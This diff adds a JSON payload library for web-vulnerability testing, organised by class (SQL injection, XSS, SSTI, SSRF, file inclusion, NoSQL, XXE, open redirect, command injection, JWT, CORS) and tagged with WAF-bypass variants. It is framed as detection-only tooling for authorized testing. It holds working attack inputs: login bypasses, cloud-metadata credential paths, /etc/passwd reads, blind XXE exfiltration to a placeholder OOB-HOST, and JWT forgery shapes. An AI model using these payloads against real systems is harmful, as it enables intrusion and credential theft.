@@ -1,0 +1,813 @@
+{
+  "version": "1",
+  "_meta": {
+    "description": "Curated per-vuln-class DETECTION payload library. Read-only / non-destructive markers only. Drawn from public corpora (PayloadsAllTheThings, PortSwigger Web Security Academy research, publicly disclosed reports) — general public knowledge. For authorized testing only.",
+    "entry_shape": "{payload, signal, note, waf_bypass} (+ optional engine for ssti). signal = the observable that confirms the bug.",
+    "oob_note": "Payloads referencing OOB-HOST require an attacker-controlled collaborator endpoint you are authorized to use. Substitute before sending."
+  },
+  "classes": {
+    "sql_injection": [
+      {
+        "payload": "'",
+        "signal": "error",
+        "note": "Single quote — breaks string context; look for SQL errors (SQLSTATE, 'unterminated quoted string', ORA-, 'You have an error in your SQL syntax').",
+        "waf_bypass": false
+      },
+      {
+        "payload": "\"",
+        "signal": "error",
+        "note": "Double quote for double-quoted string contexts (some MySQL/PostgreSQL configs).",
+        "waf_bypass": false
+      },
+      {
+        "payload": "' OR '1'='1",
+        "signal": "boolean",
+        "note": "Always-true tautology. Confirm with ' OR '1'='2 (false) and diff response length/row count.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "1 AND 1=1",
+        "signal": "boolean",
+        "note": "Numeric-context true case; pair with 1 AND 1=2 (false). Content-length delta confirms.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "' AND SLEEP(5)-- -",
+        "signal": "time",
+        "note": "MySQL time-based blind. Baseline with SLEEP(0); repeat to rule out network jitter.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "'; WAITFOR DELAY '0:0:5'-- -",
+        "signal": "time",
+        "note": "MSSQL stacked time-based blind.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -",
+        "signal": "time",
+        "note": "MySQL subquery time-based — fires where a bare SLEEP() is filtered or optimized away.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "1' AND pg_sleep(5)-- -",
+        "signal": "time",
+        "note": "PostgreSQL time-based blind.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "' UNION SELECT NULL-- -",
+        "signal": "union",
+        "note": "Column-count probe. Add NULLs until the error clears to learn column count.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "' UNION SELECT @@version,NULL-- -",
+        "signal": "union",
+        "note": "Banner extraction once column count and a string-typed column are known (MySQL/MSSQL).",
+        "waf_bypass": false
+      },
+      {
+        "payload": "' AND extractvalue(1,concat(0x7e,version()))-- -",
+        "signal": "error",
+        "note": "MySQL error-based extraction via XPATH error; version() echoed after ~ in the error text.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "'/**/OR/**/'1'='1",
+        "signal": "boolean",
+        "note": "Inline-comment whitespace substitution to evade naive space/keyword filters.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "'%09OR%0a'1'='1",
+        "signal": "boolean",
+        "note": "Tab/newline whitespace alternation to bypass WAF regexes expecting a literal space.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "' oR '1'='1",
+        "signal": "boolean",
+        "note": "Mixed-case keyword to defeat case-sensitive keyword blocklists.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "' UnIoN/**/SeLeCt/**/NULL-- -",
+        "signal": "union",
+        "note": "Combined case + inline-comment UNION SELECT obfuscation.",
+        "waf_bypass": true
+      }
+    ],
+    "xss": [
+      {
+        "payload": "<script>alert(1)</script>",
+        "signal": "reflection",
+        "note": "Baseline reflection probe. Confirm tags render unescaped in HTML body context (not entity-encoded).",
+        "waf_bypass": false
+      },
+      {
+        "payload": "\"><script>alert(1)</script>",
+        "signal": "reflection",
+        "note": "Breaks out of a double-quoted attribute value before injecting a script tag.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "'><svg onload=alert(1)>",
+        "signal": "reflection",
+        "note": "Single-quote attribute breakout + event-handler vector (no <script> needed).",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<img src=x onerror=alert(1)>",
+        "signal": "reflection",
+        "note": "Broken-image onerror handler — fires without a script tag; common when <script> is stripped.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<svg/onload=alert(1)>",
+        "signal": "reflection",
+        "note": "Slash separator instead of space — bypasses filters keyed on 'svg '.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "javascript:alert(1)",
+        "signal": "reflection",
+        "note": "For href/src sinks and redirect params. Confirm it lands in an attribute that executes URIs.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "\" autofocus onfocus=alert(1) x=\"",
+        "signal": "reflection",
+        "note": "Attribute-context injection that fires on autofocus with no user interaction.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{{constructor.constructor('alert(1)')()}}",
+        "signal": "reflection",
+        "note": "Client-side template injection (AngularJS sandbox escape) — confirm a JS template framework is in use.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<body onpageshow=alert(1)>",
+        "signal": "reflection",
+        "note": "Alternative event handler when onload/onerror are filtered.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "<sCrIpT>alert(1)</ScRiPt>",
+        "signal": "reflection",
+        "note": "Mixed case to defeat case-sensitive tag blocklists.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">",
+        "signal": "reflection",
+        "note": "HTML-entity-encoded handler body to bypass keyword filters scanning for literal 'alert'.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarea/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
+        "signal": "reflection",
+        "note": "Polyglot (Heyes/0xsobky style) — fires across HTML, attribute, script, comment and URI contexts in one shot.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "<details open ontoggle=alert(1)>",
+        "signal": "reflection",
+        "note": "ontoggle auto-fires on a <details open> element; useful when img/svg are filtered.",
+        "waf_bypass": true
+      }
+    ],
+    "ssti": [
+      {
+        "payload": "${7*7}",
+        "signal": "math",
+        "note": "Generic probe — JSP EL / Spring SpEL / FreeMarker / Mako. Output 49 indicates evaluation.",
+        "waf_bypass": false,
+        "engine": "java_el|spel|freemarker|mako"
+      },
+      {
+        "payload": "{{7*7}}",
+        "signal": "math",
+        "note": "Jinja2 / Twig / Nunjucks. Output 49 = evaluation. Use {{7*'7'}} to disambiguate.",
+        "waf_bypass": false,
+        "engine": "jinja2|twig|nunjucks"
+      },
+      {
+        "payload": "#{7*7}",
+        "signal": "math",
+        "note": "Ruby (Slim/interpolation) / Thymeleaf-style. Output 49 confirms.",
+        "waf_bypass": false,
+        "engine": "ruby|thymeleaf"
+      },
+      {
+        "payload": "<%= 7*7 %>",
+        "signal": "math",
+        "note": "ERB (Ruby) / classic EJS. Output 49 confirms server-side evaluation.",
+        "waf_bypass": false,
+        "engine": "erb|ejs"
+      },
+      {
+        "payload": "{{7*'7'}}",
+        "signal": "math",
+        "note": "Engine fingerprint: Jinja2 -> 7777777 (string repeat); Twig -> 49. Disambiguates Python vs PHP engine.",
+        "waf_bypass": false,
+        "engine": "jinja2|twig"
+      },
+      {
+        "payload": "${{7*7}}",
+        "signal": "math",
+        "note": "Hybrid brace-dollar probe; catches engines requiring either prefix (Twig/Smarty edge cases).",
+        "waf_bypass": false,
+        "engine": "twig|smarty"
+      },
+      {
+        "payload": "{7*7}",
+        "signal": "math",
+        "note": "Smarty single-brace probe. Output 49 confirms Smarty (PHP).",
+        "waf_bypass": false,
+        "engine": "smarty"
+      },
+      {
+        "payload": "@(7*7)",
+        "signal": "math",
+        "note": "Razor (ASP.NET) probe. Output 49 confirms server-side Razor evaluation.",
+        "waf_bypass": false,
+        "engine": "razor"
+      },
+      {
+        "payload": "#set($x=7*7)$x",
+        "signal": "math",
+        "note": "Apache Velocity — assigns then prints 49 if evaluated.",
+        "waf_bypass": false,
+        "engine": "velocity"
+      },
+      {
+        "payload": "*{7*7}",
+        "signal": "math",
+        "note": "Thymeleaf selection-expression probe.",
+        "waf_bypass": false,
+        "engine": "thymeleaf"
+      },
+      {
+        "payload": "{{7*7}}${7*7}<%= 7*7 %>#{7*7}",
+        "signal": "math",
+        "note": "Multi-engine polyglot — observe which delimiter yields 49 to fingerprint the engine in one request.",
+        "waf_bypass": false,
+        "engine": "polyglot"
+      },
+      {
+        "payload": "{{ '7'.__class__ }}",
+        "signal": "introspect",
+        "note": "Jinja2 sandbox-escape recon — leaking the class confirms reach into the Python object model. Detection only.",
+        "waf_bypass": false,
+        "engine": "jinja2"
+      },
+      {
+        "payload": "${T(java.lang.System).getProperty('os.name')}",
+        "signal": "introspect",
+        "note": "SpEL type-reference recon — returning the OS name confirms Spring SpEL evaluation. Benign property read.",
+        "waf_bypass": false,
+        "engine": "spel"
+      }
+    ],
+    "ssrf": [
+      {
+        "payload": "http://169.254.169.254/latest/meta-data/",
+        "signal": "metadata",
+        "note": "AWS IMDSv1 metadata root. A meta-data directory listing confirms SSRF to cloud metadata.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "signal": "metadata",
+        "note": "AWS IAM role enumeration — stop at confirming reachability; do NOT exfiltrate the role/keys.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
+        "signal": "metadata",
+        "note": "GCP metadata (needs header 'Metadata-Flavor: Google' for data; reachability alone is the SSRF signal).",
+        "waf_bypass": false
+      },
+      {
+        "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "signal": "metadata",
+        "note": "Azure IMDS (needs header 'Metadata: true'). Reachability confirms SSRF.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "http://127.0.0.1:80/",
+        "signal": "internal",
+        "note": "Loopback probe — response/timing differing from an external host signals internal reachability.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "http://localhost/",
+        "signal": "internal",
+        "note": "Hostname loopback — catches filters that block the 127.0.0.1 literal but resolve localhost.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "http://[::1]/",
+        "signal": "internal",
+        "note": "IPv6 loopback — bypasses IPv4-only SSRF blocklists.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "http://2130706433/",
+        "signal": "internal",
+        "note": "Decimal-integer encoding of 127.0.0.1 — defeats string-match blocklists on '127.0.0.1'.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "http://0177.0.0.1/",
+        "signal": "internal",
+        "note": "Octal-encoded 127.0.0.1 SSRF bypass.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "http://0x7f.0x0.0x0.0x1/",
+        "signal": "internal",
+        "note": "Hex-octet-encoded loopback bypass.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "http://169.254.169.254.nip.io/latest/meta-data/",
+        "signal": "metadata",
+        "note": "DNS-wildcard (nip.io) resolves to the literal IP — bypasses filters blocking only the raw 169.254.169.254 string.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "http://allowed-host@169.254.169.254/latest/meta-data/",
+        "signal": "metadata",
+        "note": "Userinfo-confusion — parsers reading host before '@' allowlist the fake host while the request still hits metadata.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "http://169.254.169.254%2523@allowed-host/",
+        "signal": "metadata",
+        "note": "Double-encoded fragment/userinfo confusion to slip past allowlist validators.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "gopher://127.0.0.1:6379/_PING%0d%0a",
+        "signal": "internal",
+        "note": "gopher:// protocol smuggling against internal Redis/etc. DETECTION: a benign PING only — never write or modify data.",
+        "waf_bypass": true
+      }
+    ],
+    "lfi": [
+      {
+        "payload": "../../../../etc/passwd",
+        "signal": "file_read",
+        "note": "Unix traversal — 'root:x:0:0:' in the response confirms file read.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "....//....//....//....//etc/passwd",
+        "signal": "file_read",
+        "note": "Doubled dot-slash that survives a single non-recursive '../' strip (collapses back to ../).",
+        "waf_bypass": true
+      },
+      {
+        "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "signal": "file_read",
+        "note": "URL-encoded traversal to bypass filters scanning for literal '../'.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "%252e%252e%252fetc%252fpasswd",
+        "signal": "file_read",
+        "note": "Double-URL-encoded traversal — for proxies/apps that decode twice.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "signal": "file_read",
+        "note": "Overlong UTF-8 encoding of '/' (legacy IIS/Tomcat) traversal bypass.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "../../../../etc/passwd%00",
+        "signal": "file_read",
+        "note": "Null-byte truncation to drop an appended extension (old PHP < 5.3.4 and some other stacks).",
+        "waf_bypass": true
+      },
+      {
+        "payload": "..\\..\\..\\..\\windows\\win.ini",
+        "signal": "file_read",
+        "note": "Windows traversal — '[fonts]' / '[extensions]' section in win.ini confirms read.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "php://filter/convert.base64-encode/resource=index.php",
+        "signal": "source_disclosure",
+        "note": "PHP wrapper returns base64 of source — decode to confirm; non-destructive source disclosure.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "php://filter/read=string.rot13/resource=index.php",
+        "signal": "source_disclosure",
+        "note": "ROT13 filter variant when base64 conversion is filtered.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "file:///etc/passwd",
+        "signal": "file_read",
+        "note": "Explicit file:// scheme — catches handlers that strip traversal but honor wrappers.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "/proc/self/environ",
+        "signal": "file_read",
+        "note": "Process environment read — confirms LFI; detection only, do not harvest secrets.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "/proc/self/cmdline",
+        "signal": "file_read",
+        "note": "Null-separated process args — alternative LFI confirmation on Linux.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "....\\\\....\\\\....\\\\windows\\\\win.ini",
+        "signal": "file_read",
+        "note": "Doubled-backslash Windows variant to survive single-pass '..\\' stripping.",
+        "waf_bypass": true
+      }
+    ],
+    "nosql_injection": [
+      {
+        "payload": "{\"$ne\": null}",
+        "signal": "operator",
+        "note": "MongoDB $ne (not-equal-null) as a JSON field — matches all docs, bypasses auth/filter.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"$gt\": \"\"}",
+        "signal": "operator",
+        "note": "$gt empty-string — true for all non-empty values; auth-bypass primitive.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "username[$ne]=&password[$ne]=",
+        "signal": "operator",
+        "note": "Bracket form for x-www-form-urlencoded bodies parsed into objects (Express/qs).",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+        "signal": "operator",
+        "note": "Full login-bypass body — both fields always-true.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"$regex\": \"^a\"}",
+        "signal": "operator",
+        "note": "$regex anchored match — basis for blind char-by-char extraction (diff vs '^z' to detect).",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"$where\": \"sleep(5000)\"}",
+        "signal": "time",
+        "note": "MongoDB $where JS time-based blind. Baseline with sleep(0). Detection only, non-destructive.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"$where\": \"this.password.length > 0\"}",
+        "signal": "operator",
+        "note": "$where boolean differential confirming server-side JS evaluation.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "admin'||'1'=='1",
+        "signal": "boolean",
+        "note": "JS-context string-break for $where/eval injection (||'1'=='1' always true).",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"$gt\": undefined}",
+        "signal": "operator",
+        "note": "Comparison-against-undefined trick; alternative when $ne null is filtered.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "{\"$nin\": []}",
+        "signal": "operator",
+        "note": "$nin empty-array matches everything — filter/auth bypass when $ne is blocklisted.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "{\"$in\": [\"a\",\"b\",\"c\"]}",
+        "signal": "operator",
+        "note": "$in operator injection — confirms object-operator parsing of user input.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "'; return true; var x='",
+        "signal": "boolean",
+        "note": "$where JS-injection forcing a true return; detects server-side JS eval.",
+        "waf_bypass": false
+      }
+    ],
+    "xxe": [
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        "signal": "file_read",
+        "note": "Classic in-band XXE — 'root:x:0:0:' echoed in the response confirms entity expansion + file read.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>",
+        "signal": "file_read",
+        "note": "Windows in-band XXE — win.ini contents in the response confirm read.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&xxe;</root>",
+        "signal": "file_read",
+        "note": "PHP-filter-wrapped XXE — returns base64 (decode to confirm); needed when file content has XML-breaking chars.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://OOB-HOST/x\"> %xxe;]><root/>",
+        "signal": "oob",
+        "note": "Out-of-band parameter-entity XXE for blind cases — a callback to your authorized collaborator host confirms.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
+        "signal": "ssrf",
+        "note": "XXE-driven SSRF to cloud metadata — reachability is the signal; do not exfiltrate credentials.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE data SYSTEM \"http://OOB-HOST/x.dtd\"><data>&send;</data>",
+        "signal": "oob",
+        "note": "External-DTD blind XXE skeleton — remote x.dtd defines the callback entity. Authorized collaborator host only.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<!DOCTYPE root [<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'http://OOB-HOST/?x=%a;'>\">%b;%c;]>",
+        "signal": "oob",
+        "note": "Error/OOB nested parameter-entity exfil pattern for blind XXE where direct reflection is unavailable.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        "signal": "file_read",
+        "note": "UTF-16 declaration to bypass naive WAFs that only scan UTF-8 ASCII signatures.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"jar:file:///nonexistent!/\">]><root>&xxe;</root>",
+        "signal": "error",
+        "note": "Java jar: protocol probe — distinctive parser error fingerprints a Java XML stack vulnerable to XXE.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"expect://id\">]><root>&xxe;</root>",
+        "signal": "command_exec",
+        "note": "DETECTION REFERENCE — PHP expect:// wrapper RCE indicator (rarely enabled). Uses benign 'id'.",
+        "waf_bypass": false
+      }
+    ],
+    "open_redirect": [
+      {
+        "payload": "https://evil.example.com",
+        "signal": "redirect",
+        "note": "Baseline absolute URL — a 30x Location to a domain you control confirms open redirect.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "//evil.example.com",
+        "signal": "redirect",
+        "note": "Protocol-relative — browsers treat // as scheme-relative; bypasses validators requiring 'http'.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "/\\evil.example.com",
+        "signal": "redirect",
+        "note": "Backslash variant — many parsers normalize \\ to / so this becomes //host.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "https://trusted.com.evil.example.com",
+        "signal": "redirect",
+        "note": "Suffix-confusion — bypasses allowlists doing a naive startswith/contains 'trusted.com'.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "https://evil.example.com?trusted.com",
+        "signal": "redirect",
+        "note": "Allowlisted token in the query string fools 'contains(trusted.com)' checks.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "https://evil.example.com#trusted.com",
+        "signal": "redirect",
+        "note": "Fragment-confusion variant of the contains-check bypass.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "https://trusted.com@evil.example.com",
+        "signal": "redirect",
+        "note": "Userinfo-confusion — trusted.com is the username, the real host is evil.example.com.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "https:evil.example.com",
+        "signal": "redirect",
+        "note": "Missing-slashes scheme — some browsers still navigate; bypasses '//' blocklists.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "////evil.example.com",
+        "signal": "redirect",
+        "note": "Multiple leading slashes collapse to // in some normalizers, bypassing single-// filters.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "%2f%2fevil.example.com",
+        "signal": "redirect",
+        "note": "URL-encoded protocol-relative — for params decoded once before the redirect check.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "https://evil.example.com%2F%2E%2E",
+        "signal": "redirect",
+        "note": "Encoded path-confusion to defeat suffix-allowlist validators.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "javascript:alert(document.domain)",
+        "signal": "xss_via_redirect",
+        "note": "If the redirect sink writes the value into href/location without scheme validation this escalates to XSS — detection only.",
+        "waf_bypass": false
+      }
+    ],
+    "command_injection": [
+      {
+        "payload": "; id",
+        "signal": "command_exec",
+        "note": "BENIGN marker — semicolon separator; 'uid=...gid=...' in output confirms execution. No system change.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "| id",
+        "signal": "command_exec",
+        "note": "Pipe separator variant — benign id marker.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "& whoami",
+        "signal": "command_exec",
+        "note": "Ampersand separator (Windows & Unix). whoami output is a benign identity marker.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "&& whoami",
+        "signal": "command_exec",
+        "note": "AND-chained benign marker — runs only if the prior command succeeds.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "`id`",
+        "signal": "command_exec",
+        "note": "Backtick command substitution — benign id marker.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "$(id)",
+        "signal": "command_exec",
+        "note": "Dollar-paren command substitution — benign id marker; modern-shell equivalent of backticks.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "%0aid",
+        "signal": "command_exec",
+        "note": "Newline (URL-encoded LF) injection — benign id; bypasses filters blocking ;|& but not line breaks.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "; sleep 5",
+        "signal": "time",
+        "note": "Blind/time-based confirmation when output is not reflected. Benign — baseline with sleep 0.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "| ping -c 1 OOB-HOST",
+        "signal": "oob",
+        "note": "Out-of-band DNS/ICMP confirmation for blind cases. Single benign packet to an authorized collaborator host only.",
+        "waf_bypass": false
+      },
+      {
+        "payload": ";${IFS}id",
+        "signal": "command_exec",
+        "note": "${IFS} substitutes a space — bypasses filters blocking literal spaces. Benign id marker.",
+        "waf_bypass": true
+      },
+      {
+        "payload": ";i\\d",
+        "signal": "command_exec",
+        "note": "Backslash inside the command name evades naive keyword filters on 'id' while the shell still runs id. Benign.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "; c''a''t /etc/hostname",
+        "signal": "command_exec",
+        "note": "Quote-insertion obfuscation reads a benign non-sensitive file (hostname) to confirm RCE without touching secrets.",
+        "waf_bypass": true
+      }
+    ],
+    "jwt": [
+      {
+        "payload": "{\"alg\":\"none\",\"typ\":\"JWT\"}",
+        "signal": "alg_none",
+        "note": "alg:none header — re-encode with an empty signature; acceptance means signature verification is disabled. Forge with unchanged claims first to confirm.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"alg\":\"None\",\"typ\":\"JWT\"}",
+        "signal": "alg_none",
+        "note": "Case variation of alg:none — bypasses libraries blocklisting only lowercase 'none'.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "{\"alg\":\"nOnE\",\"typ\":\"JWT\"}",
+        "signal": "alg_none",
+        "note": "Mixed-case none — broader case-confusion probe.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "{\"alg\":\"HS256\"}",
+        "signal": "alg_confusion",
+        "note": "RS256->HS256 confusion: sign with the RSA public key as the HMAC secret. If the public key is known and the server verifies HS256 with it, forgery succeeds.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}",
+        "signal": "kid_injection",
+        "note": "kid path-traversal to a predictable/empty key file (/dev/null -> empty key) enabling forgery. Detection only.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "{\"alg\":\"HS256\",\"kid\":\"1' UNION SELECT 'secret'-- -\"}",
+        "signal": "kid_sqli",
+        "note": "kid SQL-injection — if the key is looked up via SQL, inject to control the returned signing key.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"alg\":\"RS256\",\"jku\":\"https://OOB-HOST/jwks.json\"}",
+        "signal": "jku_ssrf",
+        "note": "jku pointing at an attacker-hosted JWKS — if fetched unvalidated, attacker controls the verification key. A callback confirms. Authorized host only.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"alg\":\"RS256\",\"jwk\":{\"kty\":\"RSA\",\"n\":\"<attacker-modulus>\",\"e\":\"AQAB\"}}",
+        "signal": "embedded_jwk",
+        "note": "Embedded JWK — if the verifier trusts a key embedded in the header, sign with your own keypair to forge. Detects header-injected-key trust.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"alg\":\"HS256\"}.{\"sub\":\"admin\",\"role\":\"admin\"}",
+        "signal": "weak_secret",
+        "note": "Claim-tamper probe paired with offline HMAC brute force (common weak secrets / wordlist). A crack confirms a weak-key vuln. Detection only.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "{\"alg\":\"none\"}.{\"sub\":\"user\",\"admin\":true}.",
+        "signal": "alg_none",
+        "note": "Full forged-token shape for alg:none privesc test (base64url header.claims + empty signature). Confirmed by an accepted elevated claim.",
+        "waf_bypass": false
+      }
+    ],
+    "cors": [
+      {
+        "payload": "Origin: https://evil.example",
+        "signal": "reflection",
+        "note": "Arbitrary attacker Origin reflected in Access-Control-Allow-Origin (esp. with Allow-Credentials: true) = credentialed cross-origin read.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "Origin: null",
+        "signal": "reflection",
+        "note": "ACAO: null accepted — exploitable from sandboxed iframes / data: URIs.",
+        "waf_bypass": false
+      },
+      {
+        "payload": "Origin: https://target.example.evil.com",
+        "signal": "reflection",
+        "note": "Suffix-match bypass: app allows *.target.example but reflects an attacker domain that merely contains it.",
+        "waf_bypass": true
+      },
+      {
+        "payload": "Origin: https://eviltarget.example",
+        "signal": "reflection",
+        "note": "Prefix-match bypass: naive startswith('https://target') check.",
+        "waf_bypass": true
+      }
+    ]
+  }
+}
